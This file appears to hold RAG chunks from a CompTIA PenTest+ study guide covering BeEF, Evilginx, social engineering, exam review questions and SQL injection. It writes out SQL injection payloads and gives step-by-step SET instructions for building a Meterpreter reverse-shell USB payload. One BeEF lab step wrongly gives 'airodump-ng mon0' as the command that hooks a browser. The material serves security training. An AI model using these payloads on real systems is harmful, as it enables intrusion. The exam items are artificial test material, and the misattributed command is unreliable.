rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	with a login screen. The default username and password is beef. Once you have a browser hooked, BeEF provides a large set of tools that you can use to take action inside the browser. These include detection capabilities for settings and programs, as well as direct actions like playing sounds or asking the remote page for permission to turn on the webcam or getting lists of visited sites and domains. If the browser allows it, BeEF can also detect locally installed plug‐ins and software, use specific exploits against the browser, perform DoS attacks, or even attempt to install persistence tools. Figure 8.5 shows some of the commands that BeEF provides. Much like the other tools you have explored in this book, BeEF is far deeper than we can cover in this chapter. The BeEF project website provides videos, wiki documentation, and other information that can help get you started with the tool. You can find it at http://beefproject.com. FIGURE 8.4 BeEF hooked browser detail Caller ID Spoofing A final set of tools that pentesters may need is caller ID and VoIP call spoofing tools. Metasploit's SIP INVITE spoofing tool can send fake VoIP SIP invites to targets, and other tools like Viproy provide broad functionality for penetration testing VoIP networks. The PenTest+ exam outline includes the use of call spoofing tools like these as a technique that you should be aware of, particularly in the context of social engineering attacks like vishing attempts. FIGURE 8.5 BeEF commands usable in a hooked browser Gophish If you need a testing tool to see if your organization is vulnerable to phishing attacks, Gophish is a great tool that can help. Gophish is an open source phishing framework that gives you the ability to test your organization's exposure to phishing attempts. The Gophish framework allows a pentester to assess an organization for phishing attacks. It comes with templates that are extremely easy to use and, once you've configured it, you can conduct a campaign such as an email phishing in real time. You can access the tool and learn more at https://getgophish.com and https://github.com/gophish/gophish. Evilginx Another framework available is Evilginx. Evilginx is a helpful tool that allows you to conduct testing of on‐path reverse‐proxy attacks. It can be used to conduct phishing attacks to gain access to account or credential information and session cookies by bypassing multifactor authentication (MFA). As security analysts have learned over time, any time there is a weakness in technology, there is something put in place to bolster or secure it. MFA was the gold standard for protecting credentials due to its service offering, but as security analysts, we've also learned that whenever something is put in place to protect something, it's immediately assessed for its own weaknesses. MFA was put in place to protect users and organizations from password attacks, including guessing and brute‐force cracking attacks. Add in the codes used with MFA being “time‐based” and the need for an authenticator app or other form of out‐of‐band solution, and
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	over time, any time there is a weakness in technology, there is something put in place to bolster or secure it. MFA was the gold standard for protecting credentials due to its service offering, but as security analysts, we've also learned that whenever something is put in place to protect something, it's immediately assessed for its own weaknesses. MFA was put in place to protect users and organizations from password attacks, including guessing and brute‐force cracking attacks. Add in the codes used with MFA being “time‐based” and the need for an authenticator app or other form of out‐of‐band solution, and it's very difficult to exploit MFA. As mentioned, there has been an uptick in methods to do so, including social engineering efforts such as MFA help desks, which can be used to trick users into providing needed information, as well as adversary‐in‐the‐middle (AiTM) attacks. Evilginx is a framework that provides you with the functionality to conduct these types of attacks to gather useful information. Evilginx conducts these attacks using phishlets. These are basically preprogrammed phishing pages and they trick users into thinking they are legitimate. Once the user accesses and uses the fake page, Evilginx can steal the session information needed to conduct the AiTM attack. You can get the tool and learn more at https://github.com/kgretzky/evilginx2 and https://help.evilginx.com. Adversary in the Middle (AiTM) Adversary‐in‐the‐middle (AiTM) tools are easy to access and free to use, and they can be automated. You can learn more about how to conduct an active attack using these types of tools at https://www.deepwatch.com/labs/catching-the-phish-detecting-evilginxaitm. Recon‐ng Continuing on our journey of identifying tools that can help with gathering, aggregating, and analyzing the massive amounts of data that you are likely to acquire during the information‐gathering stage of a penetration test, our next tool is recon‐ng. As we covered in Chapter 3, “Information Gathering,” this tool can either be found in online distribution repositories (repos) like GitHub, or in Kali or many Linux distributions (distros) that are widely available. We often choose Kali because many of the toolsets you need to conduct pentesting are found in one distro (Debian). The most common setup is to install (or launch) the package and then create a workspace you can operate within. Two of Recon‐ng's selling points are that it is fully customizable and you can script with it. This allows you to automate much of the information‐ gathering process, which can run in the background. As with most of the tools mentioned in this section, its potential to help identify vulnerabilities and threats is extremely useful. Maltego Maltego was also covered in Chapter 3 when we discussed information gathering and passive reconnaissance. Maltego (www.maltego.com) is an open source information‐gathering tool developed by Maltego Technologies GmbH, a company headquartered in Munich, Germany. It is marketed as a full‐platform investigation toolset, allowing you to gather cyberthreat intelligence. It's also a search tool that you can use to gather threat intelligence on targets you want to analyze. Over time the toolset has evolved into
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	run in the background. As with most of the tools mentioned in this section, its potential to help identify vulnerabilities and threats is extremely useful. Maltego Maltego was also covered in Chapter 3 when we discussed information gathering and passive reconnaissance. Maltego (www.maltego.com) is an open source information‐gathering tool developed by Maltego Technologies GmbH, a company headquartered in Munich, Germany. It is marketed as a full‐platform investigation toolset, allowing you to gather cyberthreat intelligence. It's also a search tool that you can use to gather threat intelligence on targets you want to analyze. Over time the toolset has evolved into three major toolsets: Maltego Search, Monitor, and Evidence. Search is the basic tool that enables you to conduct reconnaissance, Monitor does active monitoring based on criteria, and Evidence does social media harvesting. It's an effective and helpful tool often used in recon of targets. As you have learned, there are a variety of tools that can help with gathering, aggregating, and analyzing the massive amounts of data that you are likely to acquire during the information‐gathering stage of a penetration test. The tool is designed to gather emails, domain information, hostnames, employee names, and open ports and banners using search engines. Maltego also builds relationship maps between people and their ties to other resources. It is considered an OSINT‐gathering tool that lets you conduct large‐scale information‐gathering exercises. theHarvester Earlier in the chapter we talked about the importance of protecting yourself from credential harvesting. A variety of tools can help with gathering, aggregating, and analyzing the massive amounts of data that you are likely to acquire during the information‐gathering stage of a penetration test. Examples include theHarvester, a tool designed to gather emails, domain information, hostnames, employee names, and open ports and banners using search engines. When using theHarvester, you can do target email address searching in bulk via a domain. So, if you wanted to harvest email addresses from a domain, input the domain, and press Enter. The tool allows you to search email addresses from a domain, and you can set the number of results you want to see. Summary Physical access to a pentesting target provides a variety of options that aren't available during remote network–based assessments. Access to wired networks, workstations, and even the ability to acquire information through dumpster diving (digging through the trash) makes on‐site penetration testing a powerful tool. Gaining access to physical facilities requires a distinct skill set. Techniques for physical access include picking and bypassing locks, cloning badges, triggering door sensors to allow access, and using in‐person forms of social engineering that allow piggybacking through secured entrances. In‐person access also allows the theft of passwords and codes via shoulder surfing— simply looking over a person's shoulder as they type in their authentication information! Social engineering is the process of using deception to manipulate individuals into performing desired actions or providing information. Pentesters frequently use social engineering both in person and via the phone, email, text messages, or other means of communication. Social
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	requires a distinct skill set. Techniques for physical access include picking and bypassing locks, cloning badges, triggering door sensors to allow access, and using in‐person forms of social engineering that allow piggybacking through secured entrances. In‐person access also allows the theft of passwords and codes via shoulder surfing— simply looking over a person's shoulder as they type in their authentication information! Social engineering is the process of using deception to manipulate individuals into performing desired actions or providing information. Pentesters frequently use social engineering both in person and via the phone, email, text messages, or other means of communication. Social engineering relies on a number of common motivating factors, including building perceived trust; making the target feel indebted so that they reciprocate in kind; persuading the target that you have the authority to require them to perform an action; or creating a sense of urgency, scarcity, or fear that motivates them to take action. A feeling of likeness or similarity is also often leveraged, as a target who feels that they have things in common with you will often sympathize and take actions to your benefit. Finally, pentesters may rely on the concept of social proof to persuade their targets. This means that you demonstrate that others have behaved similarly, making it feel more reasonable for the target to do what you want. Each of these social engineering techniques can be used for a variety of in‐ person or remote attacks. Toolkits like the Social Engineering Toolkit (SET) and the Browser Exploitation Framework (BeEF) have been built to leverage human weaknesses and match social engineering techniques with technical means to allow you to conduct exploits successfully. Email, phone, and SMS phishing relies on social engineering techniques, typically to acquire usernames, passwords, and information. Many phishing techniques have specific names, including vishing, a form of phishing via the phone; smishing, or phishing via SMS message; whaling, the practice of targeting important individuals at an organization by their role; and spear phishing, which focuses on specific individuals. Exam Essentials Explain phishing techniques. List and explain how to conduct phishing techniques, including spear phishing, SMS phishing, voice phishing, and whaling. Understand common phishing practices and why individuals or specific populations might be targeted versus a large group or an entire organization. Understand social engineering motivation techniques. Know when and how to apply common social engineering motivation techniques. Differentiate authority, scarcity, social proof, urgency, likeness, and fear‐based approaches and when and why each can be useful. Explain why combining motivation techniques can be beneficial, and which techniques work together well. Describe impersonation attacks and techniques and when you might use them as part of a social engineering effort. Describe physical security attack methods. Describe physical facility penetration testing techniques, including how to perform a tailgating attack. Explain dumpster diving, shoulder surfing, and badge cloning and explain when and why you would use each. Use social engineering tools like SET and BeEF. Have a basic familiarity with the Social Engineering Toolkit (SET) and how to
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	likeness, and fear‐based approaches and when and why each can be useful. Explain why combining motivation techniques can be beneficial, and which techniques work together well. Describe impersonation attacks and techniques and when you might use them as part of a social engineering effort. Describe physical security attack methods. Describe physical facility penetration testing techniques, including how to perform a tailgating attack. Explain dumpster diving, shoulder surfing, and badge cloning and explain when and why you would use each. Use social engineering tools like SET and BeEF. Have a basic familiarity with the Social Engineering Toolkit (SET) and how to implement common attacks using it. Understand the basic command structure, what capabilities are included in the tool, and how it integrates with Metasploit to deliver exploit packages. Explain how to set up a browser‐based attack with the Browser Exploitation Framework (BeEF), including what information it can capture, what types of exploits it provides, and what limitations may exist in using it in a penetration test. Lab Exercises Activity 8.1: Designing a Physical Penetration Test Physical penetration tests require careful planning to ensure that they are executed properly. The first step for most physical penetration tests is a site evaluation. For this exercise, you should select a site that you are familiar with and have access to. Since this activity can seem suspicious, you should get appropriate permission to review the facility if necessary. Once you have received permission, you should first determine what a penetration test of the facility might require if you were conducting one for your client. Are they interested in knowing if an on‐site data center is vulnerable? Is there a higher security zone with access controls that may need to be reviewed? Once you have this documented, you can move on to the following steps. 1. Write down the scope and target of your penetration test. What location, facility, or specific goal will you target? Use the list found on the following page as a starting point: http://www.penteststandard.org/index.php/Pre-engagement#Physical_Penetration_Test. 2. Conduct information‐gathering activities to document the facility's location and access controls and related information, such as the location and coverage of external cameras, where primary and secondary entrances and exits are, if there are guards and where they are stationed, and other externally visible details. In many cases, pentesters use cameras to capture this detail, as well as a top‐down satellite view to create a map of the security controls. 3. Use your external information gathering to create a penetration testing plan to enter the facility. Since you should actually have legitimate access to the facility, you should follow this as though you were conducting a penetration test, but without having to social‐engineer or otherwise violate security controls. Record where you would have encountered challenges or controls that your planning did not include. 4. Document your findings on the way to your target. Are there sufficient controls? Are there controls that would have stopped an attacker? What changes would you recommend to the facility's owner or the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	the security controls. 3. Use your external information gathering to create a penetration testing plan to enter the facility. Since you should actually have legitimate access to the facility, you should follow this as though you were conducting a penetration test, but without having to social‐engineer or otherwise violate security controls. Record where you would have encountered challenges or controls that your planning did not include. 4. Document your findings on the way to your target. Are there sufficient controls? Are there controls that would have stopped an attacker? What changes would you recommend to the facility's owner or the security professionals who manage its access control systems? Activity 8.2: Brute‐Forcing Services This exercise creates malicious media that may be detected by antivirus software. Ensure that you have the correct permissions and rights to run this exercise on the system you will use. In this exercise, you will use the Social Engineering Toolkit to build a malicious USB stick. You will need to have a Kali Linux virtual machine or SET built and configured on a system that you have set up, and you will need a Windows virtual machine that you can connect a physical USB device to. 1. Start SET from the Kali Linux Applications menu under Social Engineering tools. 2. Navigate in the SET menu to Social Engineering Attacks, and then select the Infectious Media Generator. 3. For this practice session, we will use the standard Metasploit executable, so select that. 4. Select the exploit package you want to use. The Windows Reverse_TCP Meterpreter is a good choice for a Windows target. 5. Provide the IP address of your Kali system when prompted, as well as a port of your choice. Run the listener when prompted. 6. When the file is completed, copy it to a USB drive. Note that some antivirus software may detect this file, so you may have to temporarily disable your antivirus to copy the file. 7. Boot your Windows virtual machine and insert the thumb drive. Once it is live, run payload.exe from the thumb drive. You should now have a reverse shell with Meterpreter running! Of course, in the real world you would have had to do a bit of social engineering to ensure that your target ran the payload. Activity 8.3: Using BeEF This exercise requires two virtual machines: a Kali Linux virtual machine and a machine with a potentially vulnerable web browser. The free browser testing virtual machines that Microsoft provides at https://learn.microsoft.com/en-us/microsoft-edge/devtools-guidechromium/device-mode/testing-other-browsers offer an excellent set of systems to practice with, and they allow you to test with older, more vulnerable browsers like Internet Explorer 8 up to current browsers like Edge. You can also install additional browsers and security plug‐ins if you want to more directly copy a specific corporate environment. 1. Start BeEF from the Kali Linux Applications menu under Social Engineering Tools. 2. Read through the Getting Started page and determine what you need to do to hook a browser. 3. Start your target system
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	vulnerable web browser. The free browser testing virtual machines that Microsoft provides at https://learn.microsoft.com/en-us/microsoft-edge/devtools-guidechromium/device-mode/testing-other-browsers offer an excellent set of systems to practice with, and they allow you to test with older, more vulnerable browsers like Internet Explorer 8 up to current browsers like Edge. You can also install additional browsers and security plug‐ins if you want to more directly copy a specific corporate environment. 1. Start BeEF from the Kali Linux Applications menu under Social Engineering Tools. 2. Read through the Getting Started page and determine what you need to do to hook a browser. 3. Start your target system and hook the browser, using this command: airodump‐ng mon0. 4. Verify that you can see the hooked browser in the Online Browsers menu to the left of the BeEF window. 5. Review the information you have gathered about the hooked browser. What version is it, and what does it not provide? You may want to repeat this with another browser like Firefox or Chrome. Which browser leaks the most information? 6. Review the BeEF Commands menu and test out commands on the remote browser. How would you use these to succeed in gaining greater control during a penetration test? Review Questions You can find the answers in the Appendix A. 1. Cynthia wants to use a phishing attack to acquire credentials belonging to the senior leadership of her target. What type of phishing attack should she use? A. Smishing B. VIPhishing C. Whaling D. Spear phishing 2. Mike wants to enter an organization's high‐security data center. Which of the following techniques is most likely to stop his tailgating attempt? A. Security cameras B. A security vestibule C. An egress sensor D. An RFID badge reader 3. Which of the following technologies is most resistant to badge cloning attacks if implemented properly? A. Low‐frequency RFID B. Magstripes C. Medium‐frequency RFID D. Smartcards Use the following scenario for questions 4, 5, and 6: Jen has been contracted to perform a penetration test against Flamingo, Inc. As part of her pentest, she has been asked to conduct a phishing campaign and to use the results of that campaign to gain access to Flamingo systems and networks. The scope of the penetration test does not include a physical penetration test, so Jen must work entirely remotely. 4. 5. Jen wants to send a phishing message to employees at the company. She wants to learn the user IDs of various targets in the company and decides to call them using a spoofed VoIP phone number similar to those used inside the company. Once she reaches her targets, she pretends to be an administrative assistant working with one of Flamingo's senior executives and asks her targets for their email account information. What type of social engineering is this? A. Impersonation B. Interrogation C. Shoulder surfing D. Administrivia 6. Jen wants to deploy a malicious website as part of her penetration testing attempt so that she can exploit browsers belonging to employees. What framework is best suited
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	the user IDs of various targets in the company and decides to call them using a spoofed VoIP phone number similar to those used inside the company. Once she reaches her targets, she pretends to be an administrative assistant working with one of Flamingo's senior executives and asks her targets for their email account information. What type of social engineering is this? A. Impersonation B. Interrogation C. Shoulder surfing D. Administrivia 6. Jen wants to deploy a malicious website as part of her penetration testing attempt so that she can exploit browsers belonging to employees. What framework is best suited to this? A. Metasploit B. BeEF C. SET D. OWASP 7. After attempting to lure employees at Flamingo, Inc., to fall for a phishing campaign, Jen finds that she hasn't acquired any useful credentials. She decides to try a USB key drop. Which of the following Social Engineer Toolkit modules should she select to help her succeed? A. The Website Attack Vectors module B. The Infectious Media Generator C. The Mass Mailer module D. The Teensy USB HID attack module 8. Chris sends a phishing email specifically to Susan, the CEO at his target company. What type of phishing attack is he conducting? A. CEO baiting B. Spear phishing C. Phish hooking D. Hook SETting 9. Frank receives a message to his cell phone from a phone number that appears to be from the IRS. When he answers, the caller tells him that he has past due taxes and is in legal trouble. What type of social engineering attack has Frank encountered? A. A spear phishing attack B. A whaling attack C. A vishing attack D. A SMS phishing attack 10. Emily wants to gather information about an organization but does not want to enter the building. What physical data‐gathering technique can she use to potentially gather business documents without entering the building? A. Piggybacking B. File surfing C. USB drops D. Dumpster diving 11. Cameron sends a phishing email to all of the administrative assistants in a company. What type of phishing attack is he conducting? A. Whaling B. Vishing C. A watering hole attack D. Spear phishing 12. Which social engineering motivation technique relies on persuading the target that other people have behaved similarly and thus that they could too? A. Likeness B. Fear C. Social proof D. Reciprocation 13. Megan wants to clone an ID badge for the company that she is performing a penetration test against. Which of the following types of badge can be cloned without even touching it? A. Magstripe B. Smartcard C. RFID D. CAC 14. Allan wants to gain access to a target company's premises but discovers that his original idea of jumping the fence probably isn't practical. His new plan is to pretend to be a delivery person with a box that requires a personal signature from an employee. What technique is he using? A. Authority B. Pretexting C. Social proof D. Likeness 15. Charles sends a phishing email to a
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	the company that she is performing a penetration test against. Which of the following types of badge can be cloned without even touching it? A. Magstripe B. Smartcard C. RFID D. CAC 14. Allan wants to gain access to a target company's premises but discovers that his original idea of jumping the fence probably isn't practical. His new plan is to pretend to be a delivery person with a box that requires a personal signature from an employee. What technique is he using? A. Authority B. Pretexting C. Social proof D. Likeness 15. Charles sends a phishing email to a target organization and includes the line “Only five respondents will receive a cash prize.” Which social engineering motivation strategy is he using? A. Scarcity B. Social proof C. Fear D. Authority 16. What occurs during a quid pro quo social engineering attempt? A. The target is offered money. B. The target is asked for money. C. The target is made to feel indebted. D. The pentester is made to feel indebted. 17. Andrew knows that the employees at his target company frequently visit a football discussion site popular in the local area. As part of his penetration testing, he successfully places malware on the site and takes over multiple PCs belonging to employees. What type of attack has he used? A. A PWNie attack B. A watercooler attack C. A clone attack D. A watering hole attack 18. Steve inadvertently sets off an alarm and is discovered by a security guard during an on‐site penetration test. What should his first response be? A. Call the police. B. Attempt to escape. C. Provide his pretext. D. Call his organizational contact. 19. A USB key drop is an example of what type of technique? A. Physical honeypot B. A humanitarian exploit C. Reverse dumpster diving D. A hybrid attack 20. Susan calls staff at the company she has been contracted to conduct a phishing campaign against, focusing on individuals in the finance department. Over a few days, she persuades an employee to send a wire transfer to an account she has set up after telling the employee that she has let their boss know how talented they are. What motivation technique has she used? A. Urgency B. Reciprocation C. Authority D. Fear 21. Alexa carefully pays attention to an employee as they type in their entry code to her target organization's high‐security area and writes down the code that she observes. What type of attack has she conducted? A. A Setec Astronomy attack B. Code surveillance C. Shoulder surfing D. Keypad capture Chapter 9 Exploiting Application Vulnerabilities THE COMPTIA PENTEST+ EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: Domain 3: Vulnerability Discovery and Analysis 3.1 Given a scenario, conduct vulnerability discovery using various techniques. Types of Scans Application scans Dynamic application security testing (DAST) Interactive application security testing (IAST) Software composition analysis (SCA) Static application security testing (SAST) Infrastructure as Code (IaC) Source code analysis Mobile scan Secrets scanning Domain 4: Attacks and
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	area and writes down the code that she observes. What type of attack has she conducted? A. A Setec Astronomy attack B. Code surveillance C. Shoulder surfing D. Keypad capture Chapter 9 Exploiting Application Vulnerabilities THE COMPTIA PENTEST+ EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: Domain 3: Vulnerability Discovery and Analysis 3.1 Given a scenario, conduct vulnerability discovery using various techniques. Types of Scans Application scans Dynamic application security testing (DAST) Interactive application security testing (IAST) Software composition analysis (SCA) Static application security testing (SAST) Infrastructure as Code (IaC) Source code analysis Mobile scan Secrets scanning Domain 4: Attacks and Exploits 4.5 Given a scenario, perform web application attacks using the appropriate tools. Attack types Brute‐force attack Collision attack Directory traversal Server‐side request forgery (SSRF) Cross‐site request forgery (CSRF) Deserialization attack Injection attacks Structured Query Language (SQL) injection Command injection Cross‐site scripting (XSS) Server‐side template injection Insecure direct object reference Session hijacking Arbitrary code execution File inclusions Remote file inclusion (RFI) Local file inclusion (LFI) Web shell API abuse JSON Web Token (JWT) manipulation Tools TruffleHog Burp Suite Zed Attack Proxy (ZAP) Postman sqlmap Gobuster/Dorbuster Wfuzz WPScan Every organization uses dozens, or even hundreds, of different applications. While security teams and administrators generally do a good job of patching and maintaining operating systems, applications are often a more difficult challenge because of their sheer number. As a result, many third‐ party tools go unpatched for extended periods of time. Custom‐developed applications often have even greater vulnerability because there is no vendor to create and release security patches. Compounding these problems is the fact that many applications are web‐based and exposed to the Internet, making them attractive targets for malicious intruders seeking to gain a foothold in an organization. Penetration testers understand this reality and use it to their advantage. Web‐based applications are the go‐to starting point for testers and hackers alike. If an attacker can break through the security of a web application and access the backend systems supporting that application, they often have the starting point they need to wage a full‐scale attack. In this chapter, we examine many of the application vulnerabilities that are commonly exploited during penetration tests. Real World Scenario Scenario Part 1: Software Assurance Throughout this book, you've been following along with the penetration test of a fictional company, MCDS, LLC. As you read through this chapter, think about how you might use application security testing tools and techniques to further your testing of the MCDS information technology environment. What role might each of the following approaches have during a penetration test? Static application security testing (SAST) Dynamic application security testing (DAST) Fuzzing Decompilation Debugging We will return to this scenario and the use of application security testing tools in the lab activities at the end of this chapter. Exploiting Injection Vulnerabilities Injection vulnerabilities are among the primary mechanisms that penetration testers use to break through a web application and gain access to the systems supporting that application. These vulnerabilities allow an attacker to supply
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	testing tools and techniques to further your testing of the MCDS information technology environment. What role might each of the following approaches have during a penetration test? Static application security testing (SAST) Dynamic application security testing (DAST) Fuzzing Decompilation Debugging We will return to this scenario and the use of application security testing tools in the lab activities at the end of this chapter. Exploiting Injection Vulnerabilities Injection vulnerabilities are among the primary mechanisms that penetration testers use to break through a web application and gain access to the systems supporting that application. These vulnerabilities allow an attacker to supply some type of code to the web application as input and trick the web server into either executing that code or supplying it to another server to execute. Input Validation Cybersecurity professionals and application developers have several tools at their disposal to help protect against injection vulnerabilities. The most important of these is input validation. Applications that allow user input should perform validation of that input to reduce the likelihood that it contains an attack. The most effective form of input validation uses input allowlisting, in which the developer describes the exact type of input that is expected from the user and then verifies that the input matches that specification before passing the input to other processes or servers. For example, if an input form prompts a user to enter their age, input allowlisting could verify that the user supplied an integer value within the range 0–120. The application would then reject any values outside that range. When you're performing input validation, it is important to ensure that validation occurs on the server rather than within the client's browser. Browser‐based validation is useful for providing users with feedback on their input, but it should never be relied on as a security control. Later in this chapter, you'll learn how easily hackers and penetration testers can bypass browser‐based input validation. It is often difficult to perform input allowlisting because of the nature of many fields that allow user input. For example, imagine a classified ad application that allows users to input the description of a product that they wish to list for sale. It would be difficult to write logical rules that describe all valid submissions to that field and also prevent the insertion of malicious code. In this case, developers might use input blocklisting to control user input. With this approach, developers do not try to explicitly describe acceptable input, but instead describe potentially malicious input that must be blocked. For example, developers might restrict the use of HTML tags or SQL commands in user input. When performing input validation, developers must be mindful of the types of legitimate input that may appear in a field. Completely disallowing the use of a single quote (') may be useful in protecting against SQL injection attacks, but it may also make it difficult to enter last names that include apostrophes, such as O'Brien. Parameter Pollution Input validation techniques are the go‐to standard
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	approach, developers do not try to explicitly describe acceptable input, but instead describe potentially malicious input that must be blocked. For example, developers might restrict the use of HTML tags or SQL commands in user input. When performing input validation, developers must be mindful of the types of legitimate input that may appear in a field. Completely disallowing the use of a single quote (') may be useful in protecting against SQL injection attacks, but it may also make it difficult to enter last names that include apostrophes, such as O'Brien. Parameter Pollution Input validation techniques are the go‐to standard for protecting against injection attacks. However, it's important to understand that attackers have historically discovered ways to bypass almost every form of security control. Parameter pollution is one technique that attackers have used successfully to defeat input validation controls. Parameter pollution works by sending a web application more than one value for the same input variable. For example, a web application might have a variable named account that is specified in a URL like this: http://www.mycompany.com/status.php?account=12345 An attacker might try to exploit this application by injecting SQL code into the application: http://www.mycompany.com/status.php?account=12345' OR 1=1;-- However, this string looks quite suspicious to a web application firewall and would likely be blocked. An attacker seeking to obscure the attack and bypass content filtering mechanisms might instead send a command with two different values for account: http://www.mycompany.com/status.php? account=12345&account=12345' OR 1=1;-- This approach relies on the premise that the web platform won't handle this URL properly. It might perform input validation on only the first argument but then execute the second argument, allowing the injection attack to slip through the filtering technology. Parameter pollution attacks depend on defects in web platforms that don't handle multiple copies of the same parameter properly. These vulnerabilities have been around for a while, and most modern platforms defend against them, but successful parameter pollution attacks still occur today due to unpatched systems or insecure custom code. Web Application Firewalls Web application firewalls (WAFs) also play an important role in protecting web applications against attack. Developers should always rely on input validation as their primary defense against injection attacks, but the reality is that applications still sometimes contain injection flaws. This can occur when developer testing is insufficient or when vendors do not promptly supply patches to vulnerable applications. WAFs function similarly to network firewalls, but they work at the Application layer. A WAF sits in front of a web server, as shown in Figure 9.1, and receives all network traffic headed to that server. It then scrutinizes the input headed to the application, performing input validation (allowlisting and/or blocklisting) before passing the input to the web server. This prevents malicious traffic from ever reaching the web server and acts as an important component of a layered defense against web application vulnerabilities. FIGURE 9.1 Web application firewall SQL Injection Attacks SQL injection attacks attempt to send commands through a web application to the back‐end database supporting that application. We
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	the Application layer. A WAF sits in front of a web server, as shown in Figure 9.1, and receives all network traffic headed to that server. It then scrutinizes the input headed to the application, performing input validation (allowlisting and/or blocklisting) before passing the input to the web server. This prevents malicious traffic from ever reaching the web server and acts as an important component of a layered defense against web application vulnerabilities. FIGURE 9.1 Web application firewall SQL Injection Attacks SQL injection attacks attempt to send commands through a web application to the back‐end database supporting that application. We covered basic SQL injection attacks in detail in Chapter 5, “Analyzing Vulnerability Scans,” so we will not repeat that explanation here. If you don't have a good understanding of how a penetration tester might carry out a SQL injection attack, be sure to go back and reread the “Injection Attacks” section of that chapter. In the basic SQL injection attack discussed in Chapter 5, the attacker is able to provide input to the web application and then monitor the output of that application to see the result. Although that is the ideal situation for an attacker, many web applications with SQL injection flaws do not provide the attacker with a means to directly view the results of the attack. However, that does not mean the attack is impossible; it simply makes it more difficult. Attackers use a technique called blind SQL injection to conduct an attack even when they don't have the ability to view the results directly. We'll discuss two forms of blind SQL injection: Boolean‐based and timing‐based. Boolean Blind SQL Injection In a Boolean blind SQL injection attack, the perpetrator sends input to the web application that tests whether the application is interpreting injected code before attempting to carry out an attack. For example, consider a web application that asks a user to enter an account number. A simple version of this web page might look like the one shown in Figure 9.2. FIGURE 9.2 Account number input page When a user enters an account number into that page, they would next see a listing of the information associated with that account, as shown in Figure 9.3. FIGURE 9.3 Account information page The SQL query supporting this application might be something similar to this: SELECT FirstName, LastName, Balance FROM Accounts WHERE AccountNumber = '$account' where the $account field is populated from the input field in Figure 9.2. In this scenario, an attacker could test for a standard SQL injection vulnerability by placing the following input in the account number field: 52019' OR 1=1;–– If successful, this would result in the following query being sent to the database: SELECT FirstName, LastName, Balance FROM Accounts WHERE AccountNumber = '52019' OR 1=1 This query would match all results. However, the design of the web application may ignore any query results beyond the first row. If this is the case, the query would display the same results as those shown in Figure
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	is populated from the input field in Figure 9.2. In this scenario, an attacker could test for a standard SQL injection vulnerability by placing the following input in the account number field: 52019' OR 1=1;–– If successful, this would result in the following query being sent to the database: SELECT FirstName, LastName, Balance FROM Accounts WHERE AccountNumber = '52019' OR 1=1 This query would match all results. However, the design of the web application may ignore any query results beyond the first row. If this is the case, the query would display the same results as those shown in Figure 9.3. Although the attacker may not be able to see the results of the query, that does not mean the attack was unsuccessful. However, with such a limited view into the application, it is difficult to distinguish between a well‐ defended application and a successful attack. The attacker can perform further testing by taking input that is known to produce results, such as providing the account number 52019 from Figure 9.3 and using SQL that modifies that query to return no results. For example, the attacker could provide this input to the field: 52019' AND 1=2;-- If the web application is vulnerable to Boolean SQL injection attacks, it would send the following query to the database: SELECT FirstName, LastName, Balance FROM Accounts WHERE AccountNumber = '52019' AND 1=2 This query, of course, never returns any results, because 1 is never equal to 2! Therefore, the web application would return a page with no results, such as the one shown in Figure 9.4. If the attacker sees this page, they can be reasonably sure that the application is vulnerable to blind SQL injection and can then attempt more malicious queries that alter the contents of the database or perform other unwanted actions. FIGURE 9.4 Account information page after blind SQL injection Timing‐Based Blind SQL Injection In addition to using the content returned by an application to assess susceptibility to blind SQL injection attacks, penetration testers may use the amount of time required to process a query as a channel for retrieving information from a database. These attacks depend on delay mechanisms provided by different database platforms. For example, Microsoft SQL Server's Transact‐SQL allows a user to specify a command such as this: WAITFOR DELAY '00:00:15' This command would instruct the database to wait 15 seconds before performing the next action. An attacker seeking to verify whether an application is vulnerable to time‐based attacks might provide the following input to the account ID field: 52019'; WAITFOR DELAY '00:00:15'; -- An application that immediately returns the result shown in Figure 9.3 is probably not vulnerable to timing‐based attacks. However, if the application returns the result after a 15‐second delay, it is likely vulnerable. This might seem like a strange attack, but it can actually be used to extract information from the database. For example, imagine that the Accounts database table used in the previous example contains an unencrypted field named Password. An attacker
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	attacker seeking to verify whether an application is vulnerable to time‐based attacks might provide the following input to the account ID field: 52019'; WAITFOR DELAY '00:00:15'; -- An application that immediately returns the result shown in Figure 9.3 is probably not vulnerable to timing‐based attacks. However, if the application returns the result after a 15‐second delay, it is likely vulnerable. This might seem like a strange attack, but it can actually be used to extract information from the database. For example, imagine that the Accounts database table used in the previous example contains an unencrypted field named Password. An attacker could use a timing‐based attack to discover the password by checking it letter by letter. The SQL to perform a timing‐based attack is a little complex, and you won't need to know it for the exam. Instead, here's some pseudocode that illustrates how the attack works conceptually: For each character in the password For each letter in the alphabet If the current character is equal to the current letter, wait 15 seconds before returning results In this manner, an attacker can cycle through all the possible password combinations to ferret out the password character by character. This may seem very tedious, but tools like SQLmap and Metasploit automate timing‐ based blind attacks, making them quite straightforward. Code Injection Attacks SQL injection attacks are a specific example of a general class of attacks known as code injection attacks. These attacks seek to insert attacker‐ written code into the legitimate code created by a web application developer. Any environment that inserts user‐supplied input into code written by an application developer may be vulnerable to a code injection attack. In addition to SQL injection, cross‐site scripting is an example of a code injection attack that inserts HTML code written by an attacker into the web pages created by a developer. We'll discuss cross‐site scripting in detail later in this chapter. Command Injection Attacks In some cases, application code may reach back to the operating system to execute a command. This is especially dangerous because an attacker might exploit a flaw in the application and gain the ability to directly manipulate the operating system. For example, consider the 